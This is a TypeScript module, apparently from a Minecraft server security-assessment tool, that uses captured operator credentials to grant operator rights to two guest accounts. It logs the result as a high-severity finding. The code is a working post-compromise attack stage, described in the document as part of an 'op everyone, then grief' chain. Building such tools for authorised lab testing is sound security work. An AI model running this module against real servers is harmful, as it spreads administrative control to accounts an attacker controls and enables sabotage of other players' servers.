import type { EngineModule } from '../types'
import { McSession, sleep } from './lib/mcSession'
import { openOperatorSession, resolvePassword } from './lib/operator'

const GUEST_NAMES = ['ImpactGuest1', 'ImpactGuest2']

export const impactOpSpread: EngineModule = {
  id: 'impact.op-spread',
  title: 'Mass operator grant (lab only)',
  destructive: true,
  async run(ctx) {
    const username = ctx.params.username?.trim() || 'Admin'
    const password = resolvePassword(ctx, username)
    if (!password) {
      throw new Error('no credentials for the operator identity — pass password or run after a takeover step')
    }

    const guests: McSession[] = []
    try {
      for (const name of GUEST_NAMES) {
        try {
          guests.push(await McSession.open(ctx.target, name, 12000))
          ctx.log(`guest "${name}" joined`)
        } catch (error) {
          ctx.log(`guest "${name}" failed to join: ${error instanceof Error ? error.message : String(error)}`)
        }
        await sleep(500)
      }
      if (guests.length === 0) throw new Error('no guest accounts could join to receive op')

      const operator = await openOperatorSession(ctx, username, password)
      try {
        const granted: string[] = []
        for (const guest of guests) {
          const out = await operator.sendAndCollect(`/op ${guest.username}`, 1000, 5000)
          ctx.log(`/op ${guest.username} → ${out.trim().slice(0, 140)}`)
          if (/made .* server operator|已.*管理员|server operator/i.test(out)) granted.push(guest.username)
        }
        ctx.evidence('opSpread', granted)
        ctx.finding({
          id: 'op-spread-demonstrated',
          severity: 'high',
          title: `Mass operator grant demonstrated (${granted.length} account(s))`,
          detail:
            'With operator access the attacker can grant op to arbitrary connected accounts, arming every player on the server — the second stage of the historical "op everyone, then grief" chain.',
          evidence: { granted, attempted: guests.map((g) => g.username) }
        })
      } finally {
        operator.close()
      }
    } finally {
      for (const guest of guests) guest.close()
    }
  }
}
